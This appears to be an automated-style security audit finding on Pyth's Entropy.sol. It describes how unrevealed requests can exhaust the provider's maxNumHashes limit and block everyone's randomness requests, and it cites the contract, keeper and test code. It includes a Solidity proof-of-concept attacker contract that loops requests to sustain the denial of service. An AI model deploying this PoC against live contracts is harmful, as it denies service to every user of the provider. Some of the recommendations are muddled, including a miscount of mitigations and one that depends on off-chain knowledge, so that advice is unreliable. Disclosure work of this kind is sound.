### Title
Unprivileged User Can Exhaust `maxNumHashes` Limit via Unrevealed Requests, DoS-ing Entropy Provider — (File: `target_chains/ethereum/contracts/contracts/entropy/Entropy.sol`)

### Summary

In `Entropy.sol`, the `maxNumHashes` guard is checked at request time using `numHashes = sequenceNumber - currentCommitmentSequenceNumber`, but `currentCommitmentSequenceNumber` is only advanced when a request is **revealed**. An unprivileged user can make `maxNumHashes` consecutive requests without revealing any, permanently exhausting the limit and causing `LastRevealedTooOld` for every subsequent request from any user until the provider's off-chain keeper intervenes.

### Finding Description

`requestHelper()` computes the outstanding-request depth and enforces the provider's `maxNumHashes` cap:

```solidity
// Entropy.sol lines 247-256
req.numHashes = SafeCast.toUint32(
    assignedSequenceNumber -
        providerInfo.currentCommitmentSequenceNumber
);
if (
    providerInfo.maxNumHashes != 0 &&
    req.numHashes > providerInfo.maxNumHashes
) {
    revert EntropyErrors.LastRevealedTooOld();
}
``` [1](#0-0) 

`currentCommitmentSequenceNumber` is the denominator of this check. It is **only advanced** inside `revealHelper()`, which is called exclusively during `reveal()` / `revealWithCallback()`:

```solidity
// Entropy.sol lines 435-438
if (providerInfo.currentCommitmentSequenceNumber < req.sequenceNumber) {
    providerInfo.currentCommitmentSequenceNumber = req.sequenceNumber;
    providerInfo.currentCommitment = providerContribution;
}
``` [2](#0-1) 

Meanwhile, `providerInfo.sequenceNumber` is incremented on **every** successful request call (line 231), regardless of whether any prior request has been revealed: [3](#0-2) 

This is the exact "check-then-act with delayed counter update" pattern from the reference report. The check reads a stale denominator (`currentCommitmentSequenceNumber`) that only moves on completion (reveal), while the numerator (`sequenceNumber`) advances on every new start (request).

### Impact Explanation

An attacker submits exactly `maxNumHashes` requests to a provider without revealing any of them. After the last successful request, `numHashes` for any new request equals `maxNumHashes + 1`, which exceeds the cap. Every subsequent `request` / `requestV2` / `requestWithCallback` call to that provider reverts with `LastRevealedTooOld`, regardless of who the caller is. The entire provider's randomness service is unavailable to all users until the provider's off-chain keeper calls `advanceProviderCommitment`.

The only on-chain recovery path is `advanceProviderCommitment`, which requires the provider to supply a valid hash-chain preimage — knowledge that is exclusively off-chain. The `fortuna` keeper polls for this condition every **30 seconds** (`UPDATE_COMMITMENTS_INTERVAL`): [4](#0-3) 

The keeper's own warning message acknowledges the attack surface: [5](#0-4) 

After the keeper recovers the provider, the attacker can immediately repeat the attack, sustaining the DoS indefinitely at a cost of `maxNumHashes × fee` per 30-second window.

### Likelihood Explanation

- Requires no privileged role — any EOA or contract can call `request` / `requestV2`.
- The attack path is confirmed by the existing test `testLastRevealedTooOld`, which demonstrates that making `provider1MaxNumHashes` requests without revealing causes the next request to fail. [6](#0-5) 
- The attacker pays fees for each of the `maxNumHashes` requests but receives no randomness in return; the cost is real but bounded and predictable.
- The 30-second keeper polling window creates a reliable, repeatable disruption window.

### Recommendation

Advance `currentCommitmentSequenceNumber` proactively rather than only on reveal. Two complementary mitigations:

1. **On-chain**: In `requestHelper`, after the `maxNumHashes` check passes, call `advanceProviderCommitment` internally (or inline the advancement) to keep `currentCommitmentSequenceNumber` close to `sequenceNumber`, so the gap never grows large enough to be weaponized.
2. **Rate-limit per requester**: Track per-address unrevealed request counts and cap them, preventing a single address from consuming the entire `maxNumHashes` budget.
3. **Shorten keeper polling interval** or make the keeper react to on-chain events rather than polling, to reduce the DoS window.

### Proof of Concept

```solidity
// Attacker contract
contract EntropyDoS {
    IEntropy entropy;
    address provider;

    constructor(address _entropy, address _provider) {
        entropy = IEntropy(_entropy);
        provider = _provider;
    }

    // Call this once with msg.value = maxNumHashes * fee
    function exhaust(uint32 maxNumHashes) external payable {
        uint128 fee = entropy.getFee(provider);
        for (uint32 i = 0; i < maxNumHashes; i++) {
            // Each request succeeds and increments sequenceNumber
            // but currentCommitmentSequenceNumber stays at 0
            entropy.request{value: fee}(
                provider,
                keccak256(abi.encodePacked(i)),
                false
            );
        }
        // Now numHashes = maxNumHashes + 1 for any new request
        // All subsequent requests from any user revert with LastRevealedTooOld
    }
}
```

After `exhaust()` completes, any call to `entropy.request(provider, ...)` by any user reverts with `EntropyErrors.LastRevealedTooOld` until the provider's keeper calls `advanceProviderCommitment` — at which point the attacker can call `exhaust()` again.

### Citations

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L228-231)
```text
        uint64 assignedSequenceNumber = providerInfo.sequenceNumber;
        if (assignedSequenceNumber >= providerInfo.endSequenceNumber)
            revert EntropyErrors.OutOfRandomness();
        providerInfo.sequenceNumber += 1;
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L247-256)
```text
        req.numHashes = SafeCast.toUint32(
            assignedSequenceNumber -
                providerInfo.currentCommitmentSequenceNumber
        );
        if (
            providerInfo.maxNumHashes != 0 &&
            req.numHashes > providerInfo.maxNumHashes
        ) {
            revert EntropyErrors.LastRevealedTooOld();
        }
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L435-438)
```text
        if (providerInfo.currentCommitmentSequenceNumber < req.sequenceNumber) {
            providerInfo.currentCommitmentSequenceNumber = req.sequenceNumber;
            providerInfo.currentCommitment = providerContribution;
        }
```

**File:** apps/fortuna/src/keeper/commitment.rs (L14-15)
```rust
const UPDATE_COMMITMENTS_INTERVAL: Duration = Duration::from_secs(30);
const UPDATE_COMMITMENTS_THRESHOLD_FACTOR: f64 = 0.95;
```

**File:** apps/fortuna/src/keeper/commitment.rs (L59-61)
```rust
    if outstanding_requests > threshold {
        // NOTE: This log message triggers a grafana alert. If you want to change the text, please change the alert also.
        tracing::warn!("Update commitments threshold reached -- possible outage or DDOS attack. Number of outstanding requests: {:?} Threshold: {:?}", outstanding_requests, threshold);
```

**File:** target_chains/ethereum/contracts/test/Entropy.t.sol (L1427-1438)
```text
    function testLastRevealedTooOld() public {
        for (uint256 i = 0; i < provider1MaxNumHashes; i++) {
            request(user1, provider1, 42, false);
        }
        assertRequestReverts(
            random.getFee(provider1),
            provider1,
            42,
            false,
            EntropyErrors.LastRevealedTooOld.selector
        );
    }
```
